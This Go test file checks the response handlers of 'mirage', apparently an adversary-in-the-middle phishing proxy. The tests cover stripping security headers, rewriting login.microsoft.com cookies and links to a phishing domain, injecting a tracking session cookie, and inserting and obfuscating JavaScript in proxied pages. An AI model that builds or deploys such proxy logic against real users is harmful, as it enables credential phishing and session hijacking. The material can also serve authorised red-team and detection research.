package response_test

import (
	"context"
	"errors"
	"io"
	"log/slog"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"testing"

	"github.com/travisbale/mirage/internal/aitm"
	"github.com/travisbale/mirage/internal/obfuscator"
	"github.com/travisbale/mirage/internal/proxy/handlers/response"
)

func newResp(code int, contentType, body string) *http.Response {
	return &http.Response{
		StatusCode: code,
		Header: http.Header{
			"Content-Type": []string{contentType},
		},
		Body:          io.NopCloser(strings.NewReader(body)),
		ContentLength: int64(len(body)),
		Request:       &http.Request{URL: mustURL("https://example.com/"), Header: http.Header{}},
	}
}

func mustURL(raw string) *url.URL {
	u, err := url.Parse(raw)
	if err != nil {
		panic(err)
	}
	return u
}

// ---- SecurityHeaderStripper -------------------------------------------------

func TestSecurityHeaderStripper_RemovesAllHeaders(t *testing.T) {
	h := &response.SecurityHeaderStripper{}
	resp := newResp(http.StatusOK, "text/html", "")
	headersToCheck := []string{
		"Content-Security-Policy",
		"Strict-Transport-Security",
		"X-Frame-Options",
		"X-Content-Type-Options",
		"X-XSS-Protection",
	}
	for _, header := range headersToCheck {
		resp.Header.Set(header, "some-value")
	}

	if err := h.Handle(&aitm.ProxyContext{}, resp); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	for _, header := range headersToCheck {
		if resp.Header.Get(header) != "" {
			t.Errorf("expected %s to be stripped, still present", header)
		}
	}
}

// ---- CookieRewriter ---------------------------------------------------------

func TestCookieRewriter_RewritesDomain(t *testing.T) {
	h := &response.CookieRewriter{}
	resp := newResp(http.StatusOK, "text/html", "")
	resp.Header.Set("Set-Cookie", "session=abc123; Domain=login.microsoft.com; Path=/; Secure")

	ctx := &aitm.ProxyContext{
		Phishlet: &aitm.PhishletDef{
			ProxyHosts: []aitm.ProxyHost{
				{PhishSubdomain: "login", OrigSubdomain: "login", Domain: "microsoft.com"},
			},
		},
		PhishletCfg: &aitm.PhishletConfig{BaseDomain: "phish.example.com"},
	}

	if err := h.Handle(ctx, resp); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	setCookie := resp.Header.Get("Set-Cookie")
	if !strings.Contains(setCookie, "phish.example.com") {
		t.Errorf("expected cookie domain rewritten to phish.example.com, got: %s", setCookie)
	}
}

func TestCookieRewriter_InjectsSessionCookieOnNewSession(t *testing.T) {
	h := &response.CookieRewriter{}
	resp := newResp(http.StatusOK, "text/html", "")

	ctx := &aitm.ProxyContext{
		IsNewSession: true,
		Session:      &aitm.Session{ID: "sess-abc"},
	}

	if err := h.Handle(ctx, resp); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	found := false
	for _, v := range resp.Header.Values("Set-Cookie") {
		if strings.Contains(v, "__ss=sess-abc") {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("expected __ss session cookie to be injected, headers: %v", resp.Header["Set-Cookie"])
	}
}

// ---- SubFilterApplier -------------------------------------------------------

func TestSubFilterApplier_ReplacesURL(t *testing.T) {
	h := &response.SubFilterApplier{}
	body := `<a href="https://login.microsoft.com/oauth2">Click</a>`
	resp := newResp(http.StatusOK, "text/html", body)
	resp.Request = &http.Request{
		Host: "login.microsoft.com",
		URL:  mustURL("https://login.microsoft.com/oauth2"),
	}

	ctx := &aitm.ProxyContext{
		Phishlet: &aitm.PhishletDef{
			SubFilters: []aitm.SubFilter{
				{
					MimeTypes: []string{"text/html"},
					Search:    regexp.MustCompile(`login\.microsoft\.com`),
					Replace:   "login.phish.example.com",
				},
			},
		},
	}

	if err := h.Handle(ctx, resp); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	result, _ := io.ReadAll(resp.Body)
	if !strings.Contains(string(result), "login.phish.example.com") {
		t.Errorf("expected URL to be rewritten, got: %s", string(result))
	}
}

func TestSubFilterApplier_SkipsNonMutableMIME(t *testing.T) {
	h := &response.SubFilterApplier{}
	body := "binary data"
	resp := newResp(http.StatusOK, "image/png", body)

	ctx := &aitm.ProxyContext{
		Phishlet: &aitm.PhishletDef{
			SubFilters: []aitm.SubFilter{
				{
					MimeTypes: []string{"text/html"},
					Search:    regexp.MustCompile(`.+`),
					Replace:   "replaced",
				},
			},
		},
	}

	if err := h.Handle(ctx, resp); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	// Body should be left alone for non-mutable MIME.
	result, _ := io.ReadAll(resp.Body)
	if string(result) != body {
		t.Errorf("expected body unchanged for non-mutable MIME, got: %s", string(result))
	}
}

// ---- JSInjector -------------------------------------------------------------

func TestJSInjector_MarkersPresent(t *testing.T) {
	h := &response.JSInjector{}
	body := "<html><body><p>Hello</p></body></html>"
	resp := newResp(http.StatusOK, "text/html; charset=utf-8", body)
	resp.Request = &http.Request{
		URL: mustURL("https://login.example.com/"),
	}

	ctx := &aitm.ProxyContext{
		Session: &aitm.Session{ID: "sess-xyz"},
	}

	if err := h.Handle(ctx, resp); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	result, _ := io.ReadAll(resp.Body)
	bodyStr := string(result)
	if !strings.Contains(bodyStr, "__mirage_injected_start__") {
		t.Error("expected __mirage_injected_start__ marker in injected body")
	}
	if !strings.Contains(bodyStr, "__mirage_injected_end__") {
		t.Error("expected __mirage_injected_end__ marker in injected body")
	}
	if !strings.Contains(bodyStr, "sess-xyz") {
		t.Error("expected session ID to appear in injected script")
	}
}

func TestJSInjector_SkipsNonHTML(t *testing.T) {
	h := &response.JSInjector{}
	body := `{"key":"value"}`
	resp := newResp(http.StatusOK, "application/json", body)

	ctx := &aitm.ProxyContext{Session: &aitm.Session{ID: "sess-1"}}

	if err := h.Handle(ctx, resp); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	result, _ := io.ReadAll(resp.Body)
	if strings.Contains(string(result), "__mirage_injected_start__") {
		t.Error("expected no injection for non-HTML response")
	}
}

func TestJSInjector_SkipsWithoutSession(t *testing.T) {
	h := &response.JSInjector{}
	body := "<html><body></body></html>"
	resp := newResp(http.StatusOK, "text/html", body)

	ctx := &aitm.ProxyContext{}

	if err := h.Handle(ctx, resp); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	result, _ := io.ReadAll(resp.Body)
	if strings.Contains(string(result), "__mirage_injected_start__") {
		t.Error("expected no injection without session")
	}
}

// ---- JSObfuscator -----------------------------------------------------------

type stubObfuscator struct {
	called bool
	fn     func(ctx context.Context, html []byte) ([]byte, error)
}

func (s *stubObfuscator) Obfuscate(ctx context.Context, html []byte) ([]byte, error) {
	s.called = true
	return s.fn(ctx, html)
}

func discardLogger() *slog.Logger { return slog.New(slog.NewTextHandler(io.Discard, nil)) }

func TestJSObfuscator_SkipsNonHTML(t *testing.T) {
	stub := &stubObfuscator{fn: func(_ context.Context, html []byte) ([]byte, error) {
		return html, nil
	}}
	h := &response.JSObfuscator{Obfuscator: stub, Logger: discardLogger()}
	resp := newResp(http.StatusOK, "application/json", `{"key":"value"}`)

	if err := h.Handle(&aitm.ProxyContext{}, resp); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if stub.called {
		t.Error("obfuscator should not be called for non-HTML response")
	}
}

func TestJSObfuscator_PassesThroughUnmarkedHTML(t *testing.T) {
	stub := &stubObfuscator{fn: func(_ context.Context, html []byte) ([]byte, error) {
		return html, nil
	}}
	h := &response.JSObfuscator{Obfuscator: stub, Logger: discardLogger()}
	body := "<html><body><script>var x = 1;</script></body></html>"
	resp := newResp(http.StatusOK, "text/html", body)

	if err := h.Handle(&aitm.ProxyContext{}, resp); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	result, _ := io.ReadAll(resp.Body)
	if string(result) != body {
		t.Errorf("expected body unchanged for unmarked HTML\ngot: %s", result)
	}
}

func TestJSObfuscator_ObfuscatesMarkedBlock(t *testing.T) {
	const sentinel = "/* obfuscated */"
	stub := &stubObfuscator{fn: func(_ context.Context, html []byte) ([]byte, error) {
		return []byte(strings.ReplaceAll(string(html), "var injected=1;", sentinel)), nil
	}}
	h := &response.JSObfuscator{Obfuscator: stub, Logger: discardLogger()}

	marked := "<script>" + obfuscator.MarkerStart + "var injected=1;" + obfuscator.MarkerEnd + "</script>"
	body := "<html><body>" + marked + "</body></html>"
	resp := newResp(http.StatusOK, "text/html", body)

	if err := h.Handle(&aitm.ProxyContext{}, resp); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	result, _ := io.ReadAll(resp.Body)
	if !strings.Contains(string(result), sentinel) {
		t.Errorf("expected obfuscated sentinel in output, got: %s", result)
	}
	if strings.Contains(string(result), "var injected=1;") {
		t.Error("expected original script content to be replaced")
	}
}

func TestJSObfuscator_DegradeGracefullyOnError(t *testing.T) {
	stub := &stubObfuscator{fn: func(_ context.Context, html []byte) ([]byte, error) {
		return nil, errors.New("sidecar unavailable")
	}}
	h := &response.JSObfuscator{Obfuscator: stub, Logger: discardLogger()}

	marked := "<script>" + obfuscator.MarkerStart + "var x=1;" + obfuscator.MarkerEnd + "</script>"
	body := "<html><body>" + marked + "</body></html>"
	resp := newResp(http.StatusOK, "text/html", body)

	if err := h.Handle(&aitm.ProxyContext{}, resp); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	result, _ := io.ReadAll(resp.Body)
	if !strings.Contains(string(result), "var x=1;") {
		t.Errorf("expected plaintext fallback on obfuscator error, got: %s", result)
	}
}
